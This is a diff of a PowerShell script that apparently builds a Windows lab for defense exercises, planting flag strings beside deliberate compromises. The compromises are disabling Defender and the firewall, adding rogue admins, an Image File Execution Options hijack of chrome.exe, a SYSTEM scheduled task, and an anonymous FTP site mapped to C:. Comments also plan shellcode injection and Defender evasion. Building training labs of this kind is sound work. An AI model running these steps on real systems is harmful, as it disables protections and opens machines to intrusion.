@@ -7,15 +7,16 @@ $BadAdminName5 = "Plankton"
 
 $FirewallFlag = "ACDLAB6{They_took_down_our_shields!}"
 $SSHFlag = "ACDLAB6{I_think_this_is_the_wrong_OS}"
-$CurrentVersionRunFlag = "ACDLAB6{Autobots_roll_out}"
-$NetcatFlag = "ACDLAB6{Nyancat_bootloader_time}"
+$CurrentVersionRunFlag = "ACDLAB6{Who_said_you_could_run_on_boot?}"
+$NetcatFlag = "ACDLAB6{Nyancat_bootloader_time!}"
 $SpawnedCMDFlag = "ACDLAB6{Hey_you_shouldn't_be_running_there}"
 $InstalledServiceFlag = "ACDLAB6{Definitely_a_legit_service}"
-$TaskSchedulerFlag = "ACDLAB6{Wanna_see_me_run_it_again}"
-$KillFTPIISFlag = "ACDLAB6{}"
-$DisableDefenderFlag = "ACDLAB6{}"
-$RDPMisconfigFlag = "ACDLAB6{}"
-$ImageFileExecutionOptionsFlag = "ACDLAB6{}"
+$TaskSchedulerFlag = "ACDLAB6{Wanna_see_me_run_it_again?}"
+$KillFTPIISFlag = "ACDLAB6{Red_team_turned_off_my_services!}"
+#$DisableDefenderFlag = "ACDLAB6{Hey_shouldn't_this_thing_be_on?}"
+$RDPMisconfigFlag = "ACDLAB6{RDP_is_a_super_secure_protocol}"
+#$ImageFileExecutionOptionsFlag = "ACDLAB6{No_chrome_for_you_:)}"
+$MapIISToCFlag = "ACDLAB6{Maybe_don't_have_C_publicly_avaialble}"
 
 function DisableDefender {
     New-Item -Path "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\" -Name "Windows Defender" -ErrorAction Continue
@@ -65,7 +66,7 @@ function MakeAdmins {
 function ImageFileExecutionOptions {
     New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options' -Name "chrome.exe" -Force -ErrorAction Continue
     Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe' -Name "Debugger" -Value "C:\chrome.exe" -Type String -Force -ErrorAction Continue
-    Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe' -Name "Flag" -Value "ACDLAB6{Can't_touch_this}" -Type String -Force -ErrorAction Continue
+    Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe' -Name "Flag" -Value "ACDLAB6{No_chrome_for_you_:)}" -Type String -Force -ErrorAction Continue
 }
 
 function DisableFirewall {
@@ -76,31 +77,31 @@ function DisableFirewall {
 }
 
 function InstallSSH {
-    # this needs to be tested, might be easier to get the openssh binary and install server and client from that
-
-    # Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
-    # Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
-    # Start-Service sshd
-    # Set-Service -Name sshd -StartupType 'Automatic' -Description $SSHFlag
-    # New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22    
+    # this needs to be tested, might be easier to get the openssh binary and install server and client from that 
 
     # [System.Environment]::SetEnvironmentVariable('Path','C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps;C:\Windows\System32\OpenSSH-Win64;')
     # C:\Windows\System32\OpenSSH-Win64\install-sshd.ps1
     # Start-Service sshd
-    # Set-Service sshd -StartupType Automatic -Description $SSHFlag
+    # Set-Service sshd -StartupType Automatic
     # New-NetFirewallRule -Name "OpenSSH" -DisplayName "OpenSSH" -Enabled 1 -Direction Inbound -Action Allow -LocalPort 22 -Protocol TCP -erroraction SilentlyContinue
+
+    # drop a text file in the ssh install dir, need to double check location
+    New-Item C:\Windows\System32\OpenSSH-Win64\flag.txt
+    Set-Content C:\Windows\System32\OpenSSH-Win64\flag.txt $SSHFlag
 }
 
 function NetcatListeners {
     # probably replace exe name with flag or something, not sure yet
     # can also put the flag in a text file next to the exe
-    # might need to include binary bytes in runner
+    # put nc in C:\Windows\Fonts\nc
     # Start-Job -ScriptBlock{C:\Windows\nc.exe -l -p 1337}
     # Start-Job -ScriptBlock{C:\Windows\nc.exe -l -p 1338}
     # Start-Job -ScriptBlock{C:\Windows\nc.exe -l -p 1339}
     # Start-Job -ScriptBlock{C:\Windows\nc.exe -l -p 1340}
     # Start-Job -ScriptBlock{C:\Windows\nc.exe -l -p 1341}
     # Start-Job -ScriptBlock{C:\Windows\nc.exe -l -p 1342}
+    New-Item 'C:\Program Files\nc\flag.txt'
+    Set-Content 'C:\Program Files\nc\flag.txt' $NetcatFlag
 }
 
 function CurrentVersionRun {
@@ -119,6 +120,11 @@ function SpawnCMDs {
 # https://github.com/smb01/PowershellTools/blob/master/inject.ps1
 # defender is flagging this, might need invoke-obfuscation
 # in ./inject.ps1
+
+# need to generate msfvenom shellcode to spawn cmd and run a command and stay open
+# probably inject two or three, targets might be explorer or a few svchosts
+# itll probably be easiest to just use the script as is
+# will need to supply the PIDs at run time
 }
 
 function InstallService {
@@ -165,6 +171,8 @@ function TaskScheduler {
 
     #     $ElevatedTrigger = '"' + $ElevatedTrigger + $CommandLine + '"'
     # }
+
+    schtasks /Create /RU system /SC MINUTE /MO 5 /TN "LegitTask" /TR C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive
 }
 
 function RDPMisconfig {
@@ -186,6 +194,17 @@ function KillFTPIIS {
     # https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-service?view=powershell-7.2
     Set-Service -Name W3SVC -Description $KillFTPIISFlag
     Set-Service -Name ftpsvc -Description $KillFTPIISFlag
+}
+
+function MapIISToC {
+    cmd.exe /C "%windir%\system32\inetsrv\appcmd.exe unlock config -section:system.webServer/handlers"
+    $sitenames = Get-IISSite | Where-Object Bindings -Match ".*ftp.*" | Select-Object -ExpandProperty Name
+    foreach ($site in $sitenames) {
+        Set-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST' -filter "system.applicationHost/sites/site[@name='$site']/ftpServer/security/authentication/anonymousAuthentication" -name "enabled" -value "True"
+        Set-ItemProperty "IIS:\Sites\$site" -Name physicalPath -Value 'C:'
+        # see if I can bind this to a path that doesn't exist
+        # ACDLAB6{Maybe_don't_have_C_publicly_avaialble}
+    }
 }
 
 function BeginMsgBox {
@@ -234,7 +253,7 @@ function Write-ZipUsing7Zip([string]$FilesToZip, [string]$ZipOutputFilePath, [st
     if (Test-Path $ZipOutputFilePath) { Remove-Item $ZipOutputFilePath -Force }
 
     $windowStyle = "Normal"
-    if ($HideWindow) { $windowStyle = "Hidden" }
+    if ($HideWindow) { $windowStyle = "Hidden" } # just do this?
 
     # Create the arguments to use to zip up the files.
     # Command-line argument syntax can be found at: http://www.dotnetperls.com/7-zip-examples
@@ -251,18 +270,21 @@ function Write-ZipUsing7Zip([string]$FilesToZip, [string]$ZipOutputFilePath, [st
     }
 }
 
+function Main {
+
+    Set-ExecutionPolicy Bypass
+
+    DisableDefender
+    MakeAdmins
+    ImageFileExecutionOptions
+    DisableFirewall
+
 # bigheck 2>&1 | tee -FilePath c:\windows\fonts\results.txt
 
 # Write-ZipUsing7Zip -FilesToZip "c:\windows\fonts\results.txt" -ZipOutputFilePath "c:\windows\fonts\results.zip" -Password "NotSqordfish:)"
 
 # Remove-Item -Path "c:\windows\fonts\results.txt" -Force
 
-
-function Main {
-    DisableDefender
-    MakeAdmins
-    ImageFileExecutionOptions
-    DisableFirewall
 }
 
 Main
